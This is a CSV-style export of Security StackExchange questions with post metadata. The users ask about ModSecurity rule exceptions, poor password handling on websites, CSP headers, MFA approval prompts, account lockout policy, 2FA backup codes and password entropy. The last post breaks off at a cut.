<p>Situation (Debian 10): I have a ssl secured url for Monit monitoring software, that works on <a href=""http://www.example.com:3286"" rel=""nofollow noreferrer"">www.example.com:3286</a> , which as verified by my Apache2 error logs, triggers modsec rule id 920350 thereby blocking my access to the Monit web GUI.</p>
<p>I used <code>echo &quot;SecRuleRemoveById 920350&quot; &gt;&gt; /etc/modsecurity/modsecurity.conf</code> to append the rule exception to modsecurity.conf (went back and verified its presence). Then restarted apache. Rule ignored.</p>
<p>So then, I tried adding the exception directly to the vhost of <a href=""http://www.example.com"" rel=""nofollow noreferrer"">www.example.com</a> using:</p>
<pre><code>&lt;ifModule mod_security2.c&gt;
         SecRuleRemoveById 920350
   &lt;/ifModule&gt;
</code></pre>
<p>Then restarted apache, and the exception was ignored again.</p>
<p>What am I missing?</p>
","268020","","","","","2023-06-30 22:07:15","ModSec Head Scratcher - Rule Exceptions ignored","<mod-security>","1","0","","","","CC BY-SA 4.0"
"117605","1","117606","","2016-03-16 13:44:48","","153","13030","<p>I have a student loan account with a company, not the biggest company but big enough to where they should have their act together. Today I couldn't remember my password to log into my account dashboard. I clicked ""forgot password"" and they prompted me with 5 questions. First Name, Last Name, last 4-digit SSN, birthday, and zip code. All information that is easily acquirable if trying hard enough, not to mention all information that is included in their periodic emails about payments. Upon typing in the information the site responds saying I have been authenticated and <strong>gives me my password in plaintext.</strong></p>

<p>So now not only is it incredibly easy to retrieve lost password details, they dont even send it to your email they just display it on screen, on top of that they store the password in plaintext in the database. This is an account that has details of my multi-thousand dollar loan as well as my bank details for auto-payments. Fortunately the one detail not given is my username, which is my full SSN, so that is the last thread of security; however, if they store passwords unhashed I'm sure my SSN is not either, making this even worse.</p>

<p>So my question is, given that this is a loan that I can't just up and leave is there/what are any precautions or steps that I can take to make this potentially more secure? Would it be worth emailing them and badgering them to upgrade their security or should I just pay as quick as possible and get out? If I do warn them, what types of threat should I say they are vulnerable to in hopes to scare them into a patch?</p>
","83603","","","","","2016-03-20 01:26:13","What to do if stuck with website that has poor security?","<passwords><account-security><web>","5","7","","","","CC BY-SA 3.0"
"43374","1","43375","","2013-10-05 04:26:25","","38","21418","<p>I just came across <a href=""https://www.grc.com/sqrl/sqrl.htm"">https://www.grc.com/sqrl/sqrl.htm</a></p>

<blockquote>
  <p>With Secure QR Login,  your phone snaps
  the QR code displayed on a website's login
  page . . . . and YOU are securely logged in.</p>
</blockquote>

<p>This seems like it would be pretty awesome - one of the problems that I can think of is if the QR reader is compromised, to display <code>www.google.com</code> instead of <code>www.nsa-super-secret-place.gov/123</code>. What other problems does this system have?</p>
","3053","","","user163495","2019-08-23 08:17:16","2019-11-25 21:10:50","Could SQRL really be as secure as they say?","<authentication><cryptography><security-theater><qr-code><sqrl>","7","2","","","","CC BY-SA 3.0"
"43435","1","","","2013-10-07 00:51:47","","0","5892","<p>Im using and IP Camera at home and I have the footage being sent to an online file storage service as well as my handheld device through the internet. If the wifi router at home is turned off or somehow malfunctions and is no longer working, will I still be able to view the footage from my handheld device or online on the storage service?</p>
","31638","","","","","2013-10-07 06:35:33","Will an IP camera still work if the wifi router breaks or is turned off?","<wifi><security-theater>","2","1","","2013-10-07 07:20:28","","CC BY-SA 3.0"
"43608","1","43610","","2013-10-10 06:36:42","","0","126","<blockquote>
  <p>Security through obscurity isn't real security. <br> That's why
  theoretically, closed source software is a wrong solution.<br> A
  software, example an operating system still needs to be secure when
  all of it's elements are known to source code level, only the private
  keys are kept secret.</p>
</blockquote>

<p><strong>Q: Who are the people (that work in security, cryptography) who said these words? The more examples for people are there the better.</strong></p>

<p>This question will be useful in future arguments when people need to discuss open vs. closed source software models regarding security. </p>
","9616","","","","","2013-10-10 07:34:50","Security principle regarding softwares","<opensource><security-theater>","1","1","","","","CC BY-SA 3.0"
"256170","1","","","2021-10-16 22:07:07","","1","185","<p>How do Android devices (at least all the non-enterprise personal devices I remember owning) display the wallpaper (usually chosen from the 'downloads' folder) on the lock screen when it first is turned on if the image file is supposed to be encrypted and therefore inaccessible/off-limits until after the password/pin/pattern is successfully entered? I only thought of this after I noticed that an old iOS device of mine only displays the background after the password is entered for the first time after it boots up. It's just curiosity, I'm not working on any projects at the moment related to this.</p>
","268670","","","","","2023-07-09 10:05:15","Storage access permissions before initial unlock upon startup","<encryption><android><account-security><permissions><content-security-policy>","1","4","","","","CC BY-SA 4.0"
"256203","1","256247","","2021-10-17 23:38:46","","0","140","<p>Not fully sure if these types of questions are allowed here, but don't see anything against it in the help centre so I'm assuming it is. Please point me to a better place to ask if it's not!</p>
<p>I'm making an account system for my website and trying to do my best to protect accounts from several types of attacks but a bit worried, possibly paranoid, that I'm going to miss some. I've not completed the sign-in page yet, but this is the code that allows users to sign up <a href=""https://hastebin.com/isuhiwavex.php"" rel=""nofollow noreferrer"">https://hastebin.com/isuhiwavex.php</a>. Currently, I'm trying to:</p>
<ul>
<li>Protect it from bots, brute-forcing and other similar suspicious activity using ReCAPTCHA v3 (allowing scores higher than 0.5)</li>
<li>Requiring passwords be more than 8 characters and contain both upper and lower case characters</li>
<li>Encrypting passwords with Argon2id with paramaters that take ~0.5 seconds for my server to process (memory cost 20000, time_cost 17, threads 2)</li>
<li>Making sure emails are in a valid format for XSS and general validity</li>
<li>Formatting HTML special chars in the username, also for XSS</li>
<li>Making sure accounts can't be created with usernames/emails that already exist</li>
</ul>
<p>When I make the login page, the only extra I plan on adding is that only 3 login attempts can be made per minute per IP. I realise an IP isn't the best way of identifying people, but wasn't sure what else I could get that could be stored in my database easily.</p>
","268708","","","","","2021-10-19 07:58:26","Are there any other account system attacks I should be aware about?","<passwords><account-security>","1","6","","","","CC BY-SA 4.0"
"117895","1","117896","","2016-03-18 14:52:06","","2","166","<p>So recently I've been getting emails that X account has been accessed from Y country with an IP address that I obviously don't own. An example would be my Steam account which recently got accessed from India (but got foiled, hooray 2FA).</p>

<p>The problem is that I have no idea where the breach is coming from and how it's happening. My system is clean <em>as far as I know</em>, my network is more secure than a regular home network, I'm the only one using said network, <a href=""https://security.stackexchange.com/q/104338/70515"">I'm not using any caching/proxy/VPN servers</a>, and I definitely have never been to India/Iran/Taiwan/etc. </p>

<p>The other problem is that I know someone definitely has a copy of my plaintext password(s) since, from the example above, Steam Guard only kicks in when the correct password is entered.</p>

<p>Changing passwords for <em>all</em> my accounts is out of the question since I have over 300 accounts spread across the web (which I think where the breach originated). My key accounts (email, social media, finance) are all protected by 2FA.</p>

<p>As a sysadmin admin-ing my own stuff, what measures should I take aside from the usual tips about breached accounts where the threat is unknown? (since usual advice usually assume the threat is known as far as my research yields)</p>

<p>Related: <a href=""https://security.stackexchange.com/q/112865/70515"">1</a> <a href=""https://security.stackexchange.com/q/108191/70515"">2</a></p>
","70515","","-1","","2017-03-17 13:14:38","2016-03-18 15:04:39","Accounts being accessed from X country","<multi-factor><incident-response><account-security><incident-analysis>","1","4","","","","CC BY-SA 3.0"
"184748","1","184765","","2018-04-27 13:49:42","","-5","162","<p>For a demo purpose i need to install a vulnerable application and i tried using XAMP server but it opens up many ports and not safe to use it. so please recommend a server to launch a vulnerable demo application in an sophisticated org environment.</p>
","134358","","","","","2018-04-27 18:36:17","what type of server is best for launching a vulnerable application on an Organization network?","<web-application><appsec><webserver><server><mod-security>","1","2","","2018-05-02 09:27:52","","CC BY-SA 3.0"
"184778","1","185013","","2018-04-28 05:52:24","","5","259","<p>A few weeks ago now I received an email that someone (not me) had made some in-game purchases on an iTunes account. I logged into my iTunes account and saw the transactions and that my account was some how joined to a family group account. Upon further investigation, the transactions were made using a different credit card that wasn't mine as they never showed up on my credit card statement (and the last 4 digits weren't mine). After an hour on the phone with Apple, I was able to get my account detached from the family group.</p>

<p>According to the Apple support, a child would need to accept an invitation to join a family group. I received no invite so the attacker was somehow able to circumvent that. </p>

<p>The account it was linked to seemed to be fake. The contact information was somewhat random. The name was <code>sger erhs</code> and address was <code>rewahgewr</code>. The province and city and postal code was where I live (although the postal code was not exactly the same as mine). After talking to a friend, I found out the in-game purchases were for a game that can only be played in China so that is probably where the attacker lives.</p>

<p>Since no purchases were made using my credit card and they didn't gain direct access to my account, what was the attackers intent here? Did the attacker get anything out of this? Besides changing my password, is there something else I be doing to be secure? </p>
","11316","","","","","2018-05-04 08:50:51","iTunes Account Joined Family Group Without Permission","<attacks><credit-card><account-security>","2","1","","","","CC BY-SA 3.0"
"184829","1","","","2018-04-29 04:57:56","","7","11497","<p>Im trying to build RAT to test on my computer. I use ngrok for hacking on WAN. But ngrok has a problem of changing its subdomain once the connection is reset. So, I cant use ngrok for hacking over WAN. I tried using ngrok sub-domain, but now it has become a premium plan. Please suggest me some alternatives for ngrok which will provide me constant subdomain even if the connection is reset. Also, suggest if there are any other methods for hacking over WAN other than SSH Tunneling, Using VPN and port forwarding.</p>
","170112","","","","","2018-04-30 21:44:16","Any Alternative to Ngrok for constant Connection?","<penetration-test><ssh><openssh><mod-security><rat>","2","3","","2018-05-02 20:36:22","","CC BY-SA 3.0"
"118190","1","118212","","2016-03-22 05:24:42","","0","2894","<p>The other I was talking with a work mate that is part of finances and He made a question that I couldn't answer at the moment.</p>

<p>""I have a lot of accounts and information about me internet. I'm really concerned that personal security is really important this days. I just would like to start again and make a new life in internet Do you know how I can do this?""</p>

<p>What would be the best for this. He also told me that He has an email account where everything is registered. Of course the same account for Facebook, Twitter, Youtube, Paypal.</p>

<p>Should he wipe you everything from this computer and start using VPN or some encryption through his internet.</p>

<p>As far as I know he would like to start a new ""LIFE"" in internet and forget about the past idenfity that he has.</p>

<p>IT'S NOT something about law related thing... Looks like he just wants to forget about his past life...</p>

<p>The main question is How to start again in internet with a different identity or having a better control about personal information, using the same computer and the same home router? </p>

<p>Thanks</p>
","70868","","70868","","2016-03-22 05:47:27","2016-03-22 09:19:52","Wipe out or dissapear and start over again in internet for personal security?","<network><internet><account-security>","2","3","","2016-03-22 08:57:12","","CC BY-SA 3.0"
"184927","1","","","2018-04-30 17:44:03","","13","7967","<p>Today I tried to sign into my Google account while at university. Google blocked the attempt, and asked for a phone number. Below is a screenshot of the form Google showed me.</p>

<p><a href=""https://i.stack.imgur.com/DU8Pq.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/DU8Pq.png"" alt=""Google Sign In Form""></a></p>

<p>It says:</p>

<blockquote>
  <p>Verify it's you<br>
  This device isn't recognized. For your security, Google wants to make sure it's really you.</p>
  
  <p>Enter a phone number to get a text message with a verification code.</p>
</blockquote>

<p>Obviously, Google thinks that knowing my password is not enough to prove ""it's me."" I don't have a phone, so I never linked any phone number with my Google account.</p>

<p>What intrigues me is the phrasing. ""Enter <em>a</em> phone number"" sounds to me like it would accept <em>any</em> number. Obviously, since I never linked a phone number, they do not have anything to compare the number entered into that field to. This also means that they cannot send me a text message with a verification code.</p>

<p>I do not understand how this improves security. They already assume that I may be an attacker who somehow got hold of my password, otherwise they would just let me log in. But what would stop an attacker from entering any phone number in their control so they can receive the verification code? Assuming that an attacker may know my password, how does this prevent them from gaining unauthorized access to my account?</p>
","177057","","","","","2023-01-01 22:37:14","How does entering ""a"" phone number help Google ""verify it's me?""","<multi-factor><google><account-security>","4","4","","","","CC BY-SA 3.0"
"184949","1","","","2018-04-30 21:30:36","","1","3323","<p>I was using Viber on my old phone. I stopped using that SIM card/number and stopped using that phone. I forgot to deactivate my Viber account. When my old SIM card carrier sells my old number to a new person, does that person access my Viber contacts and people I was talking to? </p>
","177072","","","","","2018-07-30 00:01:17","Can the person who buys my old number access my old Viber contacts?","<security-by-design>","1","2","","","","CC BY-SA 3.0"
"256685","1","","","2021-11-02 20:01:58","","7","3565","<p>Two users are using same web application online. Suddenly, I checked my profile and it was data of another user. How this is possible? We both are using the same app at the same time, the app is on cloud and we store credentials on browser local storage using <code>window.localStorage.setItem</code> method. What is causing this critical security issue and how to avoid that in the future?</p>
","269469","","6253","","2021-11-02 21:04:27","2021-11-03 14:56:56","Logging in as another user - Security Issue","<account-security><credentials><local-storage>","1","3","","","","CC BY-SA 4.0"
"256695","1","256696","","2021-11-03 05:22:50","","0","711","<p>I'm looking at my browser's console and I see the following error:</p>
<p><a href=""https://i.stack.imgur.com/rmTCD.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/rmTCD.png"" alt=""enter image description here"" /></a></p>
<p>These all pertain to the same JS file.</p>
<p>I'm trying to figure out what's the quickest way to make these error go away. I'm guessing I can put the given hash in my script declaration, something like:</p>
<pre><code>&lt;script src=&quot;/assets/scripts/main.js&quot; integrity=&quot;sha256-oB/JYOK782SSJ0f0XEuF36INIpCa5BTEt/q8IEny8x8=&quot;&gt;&lt;/script&gt;
</code></pre>
<p>Questions:</p>
<ol>
<li>Is putting that hash as the value of the <code>integrity</code> attribute that correct way to handle this problem?</li>
<li>Why does it seem like one file has three hashes?</li>
</ol>
","5955","","","","","2021-11-03 06:15:15","Content Security Policy (CSP) - why does a JS file have multiple hashes?","<content-security-policy>","1","1","","","","CC BY-SA 4.0"
"185074","1","","","2018-05-02 14:51:57","","4","223","<p>I have an app, and when they first login, I send a classic confirmation email. When users need to reinstall the app, sometimes users send messages to our support saying: ""I don't remember the email used to register my account, how can I have the verification code?""</p>

<p>This is pretty annoying, so I thought about sending to users a message like 'we sent a verification code to a***@gmail.com' but I'm getting worried about security issues and data protection policies. What do you think? Could this be a security problem? Do you know a better way?</p>
","177207","","6253","","2018-05-02 15:17:36","2018-08-01 09:22:26","Security problem with confirmation email","<account-security><eu-data-protection>","3","2","","","","CC BY-SA 4.0"
"256773","1","","","2021-11-05 13:34:11","","0","81","<p>I have been tasked with coming up with the authentication/authorization for an enterprise intranet web application. The requirements I were given were:</p>
<ol>
<li>Must authenticate against Active Directory</li>
<li>All Active Directory password requirements must be the same as that is in AD</li>
<li>The authorization within the application must take place OUTSIDE of AD. Locking/unlocking users should still take place with AD via a Support team.</li>
</ol>
<p>Originally what I did was authenticate against LDAP with the users provided credentials in which the user would get locked out of the APPLICATION only after x amount of attempts (NOT AD). I am now being told that if the user fails to login after x amount of times, they should be locked out of ALL APPS and ALL ENTERPRISE connections (essentially logged out/force signed off of Windows). My feelings are the following:</p>
<ol>
<li>It sounds like we are trying to have our cake and eat it too. We want to use AD but at the same time we don't as in the actual authorization takes place outside of it. I don't see what the purpose of this is. They seem to be trying to use SSO but at the same time aren't.</li>
<li>I don't see why this should lock the user outside of the the entire network. To access the site, the user must first be signed in over VPN (already logged in on Windows and through the VPN with 2FA). They then are required to login to the site again with their Windows password only. I don't understand the security benefits of doing this.</li>
<li>ANY user could type in whoever user they wanted to and lockout everyone from their accounts from this website. So in theory I could type in the CEOs AD name and just type in the password into the application to lock them out of the entire corporate network.</li>
</ol>
<p>Is there any rationale for the requirements I am given that makes sense from a security standpoint? Should invalid logins to an application be something that locks something out of a Windows account especially when any user on the network can access the application? Please help me understand the pros/cons of both approaches. I understand neither are &quot;ideal&quot;, but I don't think the one I am instructed to make is appropriate.</p>
","269602","","","","","2021-11-05 14:41:57","Active Directory Security Advice/Insight For Intranet Application","<account-security><active-directory><intranet>","1","0","","","","CC BY-SA 4.0"
"256871","1","","","2021-11-08 20:41:00","","0","315","<p>One common security practice is creating a low privilege account to work from, when not installing any tools or making system changes.  This question is more towards penetration testing platforms. In Kali, Parrot and other Platforms they have taken away the root user account and only gave sudo permissions.  However, many, if not most of the tools, require using sudo to use them. So is there really a point in creating a low-privilege accounts in platforms such as these?  Especially since you are going to be switching between the two quite a bit?</p>
","250412","","275693","","2022-09-07 15:51:41","2022-09-07 15:51:41","Low-privilege account and sudo permissions","<account-security><kali-linux>","2","1","","","","CC BY-SA 4.0"
"256947","1","256950","","2021-11-10 18:53:23","","18","3168","<p>I found an information leakage vulnerability on a company website and I found that the information includes all the usernames of the users.</p>
<p>I also observed that the application uses a lockout mechanism that locks out users after 5 attempts for 30 mins.</p>
<p>So will this lockout be considered a vulnerability?</p>
<p>Yes, account lockout is not a vulnerability but will the information leakage increase the severity of the problem or not?</p>
","246544","","6253","","2021-11-10 20:26:52","2021-11-11 12:14:41","Will this Account Lockout mechanism increase the severity of a information leakage vulnerability that leaks usernames?","<account-security><data-leakage><infoleak>","2","0","","","","CC BY-SA 4.0"
"256975","1","256976","","2021-11-11 15:00:24","","1","292","<p>In case you lose access to your two-factor authentication (2FA) codes, you are only required to enter one of the backup codes. So why do services like Google generate multiple codes if it doesn't increase and maybe even decrease security or user experience?</p>
","269887","","6253","","2021-11-11 15:00:41","2021-11-11 15:50:50","Why do services generate multiple 2FA backup codes?","<account-security><multi-factor><backup>","1","0","","","","CC BY-SA 4.0"
"257004","1","257005","","2021-11-12 13:18:26","","0","97","<p>Let us say you have an app where the users will be required to deposit cryptocurrency. Is it safe to let users sign in with third-party authentication? For example &quot;sign in with Google&quot; or &quot;sign in with Facebook&quot;?</p>
<p>If it is not safe, what is the reason for that?</p>
","212949","","69717","","2021-11-12 14:03:27","2021-11-14 13:38:51","Using SSO for a cryptocurrency app","<account-security><sso><third-party><federation>","1","0","","","","CC BY-SA 4.0"
"257006","1","","","2021-11-12 14:28:09","","2","766","<p>If reports are to be believed, Google and others are starting to force 2FA on user accounts starting late ~2021:
<a href=""https://www.theverge.com/2021/10/5/22710421/google-security-2fa-inactive-account-management"" rel=""nofollow noreferrer"">https://www.theverge.com/2021/10/5/22710421/google-security-2fa-inactive-account-management</a></p>
<p>I don't currently use 2FA on my accounts, and I'm reluctant to use SMS or USB Yubikey-like devices for 2FA but I'm interested in alternatives and still leveraging the 2FA security principles.  I'm also generally interested in understanding the technology used in 2FA authentication devices.</p>
<p>In my research, I've been looking at the FIDO alliance website:
<a href=""https://fidoalliance.org/fido2/"" rel=""nofollow noreferrer"">https://fidoalliance.org/fido2/</a></p>
<p>Specifically this picture:
<a href=""https://i0.wp.com/fidoalliance.org/wp-content/uploads/2019/04/FIDO2-Graphic-v3.jpg"" rel=""nofollow noreferrer"">https://i0.wp.com/fidoalliance.org/wp-content/uploads/2019/04/FIDO2-Graphic-v3.jpg</a></p>
<p>It occurs to me that WebAuthn/FIDO2 2FA methods are just software APIs, and in just provide methods for interacting with your secret key to prove you have it.  Basically, a Yubikey is just a hardware container for your secret key that's somewhat protected, but easy to interact with.  Furthermore, the &quot;client to authenticator protocol&quot; is just a software API on the platform side.</p>
<p>Questions:</p>
<ol>
<li>Can I write a pure software component (no hardware or USB key) that speaks the &quot;client to authenticator protocol&quot; and does the authentications in place of a Yubikey?  i.e. A virtual Yubikey implemented as a software application or device driver.</li>
<li>Do such components currently exist (preferably open source ones), and are there any you know about or can recommend?</li>
<li>Are there any WebAuthn/FIDO2 development libraries (preferably in Python) that let you write your own authenticator applications (virtual Yubikeys)?  i.e. A Python script that is functionally equivalent to a Yubikey in that it implements the API interface with the appropriate &quot;client to authenticator protocol&quot; to interact with your secret key.  Again, any references would be appreciated.</li>
</ol>
<p>Ideally, I would like to write my own Python script that behaves as a virtual Yubikey.  So basically, I would go to Google, and log in, and when the browser asks for the 2FA step, I could then run a Python script (or application) that retrieves my secret key and completes the 2FA handshake in place of a Yubikey.  Am I misguided in my goals, or is this type of scheme possible with the existing 2FA schemes?</p>
","269932","","","","","2021-11-13 17:07:52","Virtual Yubikey","<web-browser><account-security><multi-factor><yubikey>","2","11","","2021-11-16 18:33:02","","CC BY-SA 4.0"
"118589","1","","","2016-03-25 21:13:21","","1","700","<p>Sites like PersonalCapital require you submit your account login details for every one of your banking account providers. </p>

<p>Could personal capital potentially log into your financial accounts and make changes? What if personal capital is hacked? </p>

<p>These sites don't really seem safe to me, since they ask for financial account passwords, and could do whatever they wanted with this data.</p>
","105613","","","","","2019-08-13 02:12:29","How are sites like PersonalCapital safe/trustworthy?","<banks><account-security>","2","1","","","","CC BY-SA 3.0"
"185396","1","185397","","2018-05-07 18:06:58","","0","1603","<p>I am testing CSP header implementation. The implemented header value is:</p>

<pre><code>Content-Security-Policy: default-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' 'unsafe-eval'
X-Content-Security-Policy: default-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' 'unsafe-eval'
X-WebKit-CSP: default-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' 'unsafe-eval'
</code></pre>

<p>I know that because of unsafe-inline it is not recommended configuration, but I do not understend the meaning of ""data:"" as URI. If it is a URI that should mean that data is a scheme (like https, ftp etc.), but I don't understand the purpose of this?</p>

<p>Additionally is it recommended to use also X-Content-Security-Policy and X-WebKit-CSP headers, aren't they deprecated?</p>
","156661","","","","","2018-05-07 18:20:39","CSP header default-src: data:","<content-security-policy><header>","1","0","","","","CC BY-SA 4.0"
"257042","1","","","2021-11-13 13:54:43","","0","482","<p>On the PHP website it is stated that &quot;Developers must not use long life session IDs for auto-login because it increases the risk of stolen sessions.&quot;. Instead it is recommended to use a secure one time hash key as an auto-login key using <code>setcookie()</code> - which then becomes a persistent cookie.</p>
<p>But I cannot understand how that is safer?</p>
<p>The persistent cookie with the token can also be stolen and stealing sessions IDs is very difficult if you make sure your website never works with HTTP only, but only uses HTTPS - like with HSTS, and also prevent JavaScript access with <code>httponly</code>.</p>
<p>What am I missing here?</p>
","269988","","6253","","2021-11-13 14:09:27","2023-08-06 14:04:50","Why not use a long life session ID for auto-login instead of a persistent cookie with a token?","<php><account-security><session-management>","1","1","","","","CC BY-SA 4.0"
"185511","1","185515","","2018-05-09 15:15:11","","6","681","<p>When I use the built-in Chrome inspect element, click on the networking tab and view a login.action file or session file, it shows the password in plain text. Is this normal? </p>
","173135","","6253","","2018-05-09 15:41:30","2018-05-09 15:41:30","Inspecting code elements in browser when logging in","<web-application><web-browser><appsec><chrome><account-security>","1","0","","","","CC BY-SA 4.0"
"257227","1","","","2021-11-18 02:28:21","","0","134","<p>I have been searching resources online about proper MFA/2FA (with O365 specifically) considerations.</p>
<p>How is the MFA push challenge notification to Approve or Deny a sign-on not dangerous?  I have yet to find any articles stating this.  Most I see is how TXT based is no good.</p>
<p>Example with the Approve/Deny type of MFA: If a threat actor types in your credentials - your phone will get an Approve or Deny request.   One of our end-users today got a fake &quot;Check your VM&quot; spam message - she clicked on this message, it took her to a fake O365 Login page, she typed in her creds, a few seconds later she got an Approve or Deny request - she Approved thinking she was logging into O365-  2 minutes later we got a notification that the same user tried to log in from Russia -- immediately disabled and revoked all sessions.</p>
<p>Can someone explain to me how this MFA approval method is OK?  this would never work with TXT or authenticator code sign on. (you need to input the proper codes into the site to proceed to log on) Not to mention that the average user will just click 'approve' randomly thinking their Phone, tablet, or PC needs to approve again.</p>
<p>What am I missing here?</p>
","270264","","270264","","2021-11-18 02:57:42","2023-05-13 21:08:46","O365 MFA: Challenge (Approve or Deny) sign on - dangerous?","<authentication><account-security><multi-factor>","2","0","","","","CC BY-SA 4.0"
"257272","1","","","2021-11-19 01:42:04","","0","1438","<p>Specifically do they, but not &quot;Can they&quot; only because I'm fully aware that they are, and always have been, capable of intruding on any/all personal/sensitive data that isn't encrypted on a local drive or removable hard drive.  I'm fairly new to the encrypted data area, as well as storing data in the cloud. I'm just trying to understand this personal vault on OneDrive, better. If they find something that is against their policy, do they freeze your account permanently.. and what contact authorities? Say they found something regarding fraud for instance.. (just to understand the process better, purely for academic purposes, of course.) ..as, in this scenario, I am indeed discussing personal/family data, from a household of decent people trying to protect data such as social security, tax info, etc, commonplace files that would need privacy/protection from non-family members, outsiders, etc.</p>
","270305","","","","","2021-12-04 21:52:37","Does Microsoft scan the contents of documents uploaded to onedrives personal vault?","<privacy><account-security><intrusion><cloud-storage><microsoft-onedrive>","1","1","","","","CC BY-SA 4.0"
"257301","1","257305","","2021-11-20 04:57:10","","0","1114","<p>Is there any legitimate concerns of using WeChat in phone or computer? Is it possible they expose message data to others or for their own use? Also, will the installation of the official WeChat app jeopardize or corrupt the security and privacy of the Operating system and other files/apps residing in the phone/computer? What are all the possible concerns of using WeChat and what is the worst case scenario? And how to mitigate the possible negative effects?</p>
","","user269337","","","","2021-12-09 21:42:07","Is there any risk installing and using WeChat in phone or computer","<privacy><account-security>","1","1","","2021-12-02 23:19:50","","CC BY-SA 4.0"
"257402","1","257403","","2021-11-23 14:30:12","","4","575","<p>If a site uses HTTP and not HTTPS, is it useful to include a Content Security Policy? Can an adversary not just remove it?</p>
","96618","","","","","2021-11-23 14:37:27","Is CSP meant to be used with HTTPS (TLS) only?","<content-security-policy>","1","1","","","","CC BY-SA 4.0"
"185927","1","","","2018-05-16 19:05:50","","0","91","<p>I run a SaaS used by teams to collect company-related information (think something like Crashlytics). Even if the tool lets users invite their colleagues, we often find cases of individuals who created an account for their company but they're the only users in the team. We then end up having requests from their colleagues asking to access the account, for example when those people leave the company.</p>

<p>The data collected mostly belongs to the company (not to the individual), so the request often makes sense.</p>

<p>By talking to these people you can often <em>feel</em> they're legitimate colleagues who lost access to their data (like they know some details about what's in the account or their email addresses belong to the same company) but you can never be 100% certain of their good intentions. Allowing an unauthorized user access an account without strict verification would be a massive breach, so for now we deny such requests but that's not a great user experience, of course.</p>

<p>I was thinking maybe a potential way to solve this would be by using some company-related security questions, but I'm also open to other options. Do you happen to have the same problem and have you found a solution? Where can I find some best practices for account recovery procedures?</p>

<p>Thanks!</p>
","21941","","","","","2018-05-16 19:05:50","Policy for regaining access to a colleague's account","<password-policy><account-security><password-reset><recovery><account-lockout>","0","2","","","","CC BY-SA 4.0"
"257603","1","257604","","2021-12-01 13:37:00","","0","126","<p>I face a CSP header something like this -</p>
<p><code>default-src https:; font-src https: data:; img-src https: data:; script-src https: 'unsafe-inline' 'unsafe-eval'; style-src https: 'unsafe-inline';</code></p>
<p>So is this is secure implementation?</p>
<p>This includes <code>https:</code> so should I consider that <code>https://anyurlallowed</code>?</p>
","246544","","","","","2021-12-01 14:18:36","Is this CSP implementation is secure?","<penetration-test><content-security-policy>","1","3","","","","CC BY-SA 4.0"
"257611","1","257635","","2021-12-01 18:05:41","","37","12465","<p>I've seen some similar questions but maybe not exactly what I'm asking. Also I can't say that I've followed all the technical jargon in previous posts and am really after more of an intuitive understanding.</p>
<p>So let's say I'm allowed ten characters. The usual requirement is to use numbers, symbols, etc. But why is <code>#^Afx375Zq</code> more secure than <code>aaaaaaaaaa</code>? The hacker doesn't know that I've repeated a character ten times, so doesn't he still have to go through the testing of all possibilities or are things like repeated characters tested first?</p>
<p>Similarly, suppose I use a 21-character passphrase such as</p>
<pre><code>I like Beatles' songs.
</code></pre>
<p>Now someone might say that that's a common type of statement but again the hacker doesn't know that I'm using a passphrase instead of</p>
<pre><code>DD63@*()ZZZ125++dkeic
</code></pre>
<p>so why is it (I assume) less secure? Are passphrases tested first?</p>
","247762","","42391","","2021-12-02 20:21:20","2021-12-18 20:31:42","Why use random characters in passwords?","<passwords><account-security>","8","3","","","","CC BY-SA 4.0"
"257618","1","","","2021-12-01 22:58:00","","2","128","<p>For work and other official matters, I am often forced to use websites and apps which clearly have some kind of <a href=""https://www.kuppingercole.com/blog/balaganski/the-cargo-cult-of-cybersecurity"" rel=""nofollow noreferrer"">cargo cult</a> going on in their security department, given that they impose extremely foolish requirements on passwords:</p>
<ul>
<li>Character requirements like &quot;at least one number, at least uppercase, at least one lowercase, at least one one symbol, at least one ancient egyptian hieroglyphic, at least one mathematical symbol unknown to people with less than 3 years of graduate-level math training...&quot;</li>
<li>Inane pattern requirements like &quot;no repeating the same letter&quot;</li>
<li>Nonsense length restrictions, like &quot;8-16 chars&quot;</li>
<li>Disabling copy/paste in the password form</li>
<li>Forced password rotation at short intervals, eg. 30 days, for trivial accounts</li>
</ul>
<p>Security is of course always important, but bear in mind that I'm not talking here about the nuclear launch codes or entry to the vault at Fort Knox. I am speaking of the vast majority of my accounts that have relatively trivial importance, such as my library card, toll card for my car, health insurance portal, airline rewards account and so on. Being that I am a knowledgeable and intelligent person who already follows sufficient password security best practices, I find this style of user-hostile &quot;security&quot; to be present several problems:</p>
<ul>
<li>It arbitrarily restricts the password universe, reduces password entropy and thereby makes my secure password less secure</li>
<li>It sometimes makes it impossible to create a secure password (eg. very short max length)</li>
<li>It makes it very difficult to use a password manager</li>
<li>It makes it very difficult to follow a uniform password policy across my countless accounts</li>
</ul>
<p>I think there is some kind of arms race going on in the security business because these have gotten progressively worse over the recent years as more and more B2B tech startups enter the marketplace and try to &quot;disrupt&quot; their respective industry.</p>
<p>Ordinarily, my response to such nonsense is to patronize a competing business with a saner approach to security. However sometimes I am forced into working with a certain company (ie. I can't get my employer to single handedly change their HR solution) or virtually all competitors also engage in the same practice. Besides this being extremely onerous, I am also becoming very concerned about the actual security of the accounts themselves. I feel like if my solution is to keep fiddling with my password generator some more and move on, the company never receives negative feedback on their misguided practice, and the problem becomes worse.</p>
<p>What can I realistically do, as a user, to counteract this most effectively? Is sending a strongly worded letter my best option here?</p>
","54881","","","","","2021-12-02 08:19:21","How can I, as an enduser, put pressure on corporations and discourage password strength theater?","<password-policy><security-theater>","2","1","","2021-12-02 08:18:11","","CC BY-SA 4.0"
"257765","1","","","2021-12-07 09:04:19","","0","99","<p>I use Firefox Monitor to keep me updated if my email ever turn up on breaches or data dumps. It curates breaches data from many sources and cross reference our email to check if our email turn up on some breach somewhere. For sometimes I feel comfortable with it. If my email do turn up on one, I simply follow the common sense procedure to secure my account or abandon that site altogether if its not very important.</p>
<p>The common sense procedure I took commonly involves changing password, enabling 2FA if the site offers it (usually they do, especially after bad publicity from a breach). If I do not have password with the site (i.e. if I signed up using social media account) I simply disconnect whatever token or authorization I already gave to the site. If I keep phone number or other sensitive data on the site (e.g credit card) I simply removes it. The site can't keep my data safe once. I lost trust in it. Simple as that.</p>
<p><em>Lately however, I keep seeing my email turn up on site breaches I do not remember sign up to, or even ever visited.</em></p>
